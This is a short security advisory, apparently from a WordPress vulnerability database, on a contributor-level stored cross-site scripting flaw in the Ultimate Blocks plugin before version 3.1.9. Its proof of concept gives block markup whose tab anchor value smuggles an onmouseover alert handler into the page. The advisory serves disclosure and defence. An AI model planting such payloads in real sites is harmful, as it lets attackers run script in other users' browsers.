## WordPress Plugin Vulnerabilities

# Ultimate Blocks < 3.1.9 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its block options before outputting them back in a page/post where the block is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks

### Proof of Concept

As a contributor, put the below code in a post while in Code Editor mode and save:
```
<!-- wp:ub/tabbed-content-block {"activeControl":"tab-title-0","tabsTitle":["Tab 1"],"tabsTitleAlignment":["left"],"tabsAnchor":["123\u0022onmouseover=alert(/XSS/)//"],"useAnchors":true} -->
<!-- wp:ub/tab-block {"blockID":"aea6bee1-f915-4e26-82c6-1862edf001ed"} -->
<!-- wp:paragraph -->
<p>Move the mouse here!</p>
<!-- /wp:paragraph -->
<!-- /wp:ub/tab-block -->
<!-- /wp:ub/tabbed-content-block -->
```
The XSS will be triggered when any user will (pre)view the post and move the mouse over the "Move the mouse here!" text
